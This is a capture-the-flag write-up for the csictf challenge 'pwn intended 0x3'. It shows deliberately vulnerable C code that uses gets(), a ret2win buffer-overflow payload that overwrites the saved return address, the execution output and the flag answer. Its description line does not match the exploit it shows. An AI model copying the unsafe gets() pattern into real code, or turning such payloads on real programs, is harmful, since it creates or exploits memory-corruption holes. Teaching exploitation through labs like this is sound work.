# pwn intended 0x3

Author: [roerohan](https://github.com/roerohan)

## Description

Buffer overflow to overwrite a variable in the same function.

## Requirements

- Basic Knowledge of Buffer Overflow

## Sources

- [pwn-intended-0x3](./bin/pwn-intended-0x3): Binary
- [pwn-intended-0x3.c](./bin/pwn-intended-0x3.c)

```c
#include <stdio.h>

int main() {
    char teleport[30];

    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);

    puts("Welcome to csictf! Time to teleport again.");
    gets(teleport);
}

int flag() {
    puts("Well, that was quick. Here's your flag:");
    system("cat flag.txt");
}
```

```
Teleportation is not possible, or is it?
```

## Exploit

We have to run the `flag()` function by overwriting the `saved rip` of the `main()` function.
<br />

We first find the address of the `flag` function. We can use `gdb` or `objdump` for the same.

```bash
gdb-peda$ pdisas flag
Dump of assembler code for function flag:
   0x00000000004011ce <+0>:     push   rbp
   0x00000000004011cf <+1>:     mov    rbp,rsp
   0x00000000004011d2 <+4>:     lea    rdi,[rip+0xe5f]        # 0x402038
   0x00000000004011d9 <+11>:    call   0x401030 <puts@plt>
   0x00000000004011de <+16>:    lea    rdi,[rip+0xe7b]        # 0x402060
   0x00000000004011e5 <+23>:    call   0x401050 <system@plt>
   0x00000000004011ea <+28>:    mov    edi,0x0
   0x00000000004011ef <+33>:    call   0x401070 <exit@plt>
End of assembler dump.
```

**OR**

```bash
$ objdump -d ./pwn-intended-0x3 | grep flag
00000000004011ce <flag>:
```

The address of the flag `0x00000000004011ce` function can now be written in little endian and passed into our payload, along with 32 random characters to fill the stack, and 8 more the overwrite the `saved rbp`.

```bash
$ python2 -c "print 'a'*32 + 'b'*8  + '\xce\x11\x40\x00\x00\x00\x00\x00'" | ./pwn-intended-0x3
Welcome to csictf! Time to teleport again.
Well, that was quick. Here's your flag:
csictf{ch4lleng1ng_th3_v3ry_l4ws_0f_phys1cs}% 
```

The flag is:

```
csictf{ch4lleng1ng_th3_v3ry_l4ws_0f_phys1cs}
```
